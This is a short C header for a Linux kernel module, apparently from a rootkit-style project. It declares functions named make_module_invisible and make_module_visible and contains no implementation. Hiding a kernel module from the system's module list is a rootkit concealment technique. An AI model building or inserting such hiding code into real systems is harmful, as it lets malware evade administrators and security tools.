#ifndef INVISIBILITY_CLOAK
#define INVISIBILITY_CLOAK

#include <linux/module.h>


int make_module_invisible(struct module);
int make_module_visible(struct module);

#endif // !INVISIBILITY_CLOAK


